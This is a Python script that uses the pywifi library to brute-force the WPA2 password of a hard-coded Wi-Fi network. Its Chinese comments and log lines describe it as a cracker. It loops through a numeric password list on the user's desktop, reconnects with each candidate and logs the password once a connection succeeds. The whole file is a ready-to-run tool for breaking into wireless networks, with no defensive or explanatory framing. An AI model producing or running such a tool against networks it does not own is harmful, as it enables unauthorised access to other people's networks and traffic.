import pywifi
from pywifi import const
import time
import datetime
import logging

# 配置日志记录器
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 添加文件处理器
LOG_FILE_PATH = "wifi_crack.log"
file_handler = logging.FileHandler(LOG_FILE_PATH)
file_handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
file_handler.setFormatter(formatter)
logging.getLogger().addHandler(file_handler)

# 常量定义
SSID_TO_CONNECT = "CU_fb5g_2.4G"
PASSWORDS_FILE_PATH = "C:\\Users\\Administrator\\Desktop\\numberPass.txt"

# 测试连接，返回链接结果
def wifi_connect(pwd):
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.disconnect()
    time.sleep(1)
    wifistatus = ifaces.status()
    if wifistatus == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()
        profile.ssid = SSID_TO_CONNECT
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = pwd
        ifaces.remove_all_network_profiles()
        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        time.sleep(3)
        if ifaces.status() == const.IFACE_CONNECTED:
            logging.info("WiFi连接成功！")
            return True
        else:
            logging.warning("WiFi连接失败！")
            return False
    else:
        logging.info("已有WiFi连接")

# 读取密码本
def read_passwords():
    logging.info("开始破解:")
    with open(PASSWORDS_FILE_PATH, "r") as file:
        for pad in file:
            try:
                result = wifi_connect(pad)
                if result:
                    logging.info(f"密码已破解： {pad}")
                    logging.info("WiFi已自动连接！！！")
                    break
                else:
                    logging.info(f"密码破解中....密码校对: {pad}")
            except:
                continue

# 主程序
if __name__ == "__main__":
    start = datetime.datetime.now()
    read_passwords()
    end = datetime.datetime.now()
    logging.info("破解WiFi密码一共用了多长时间：%s", (end - start))
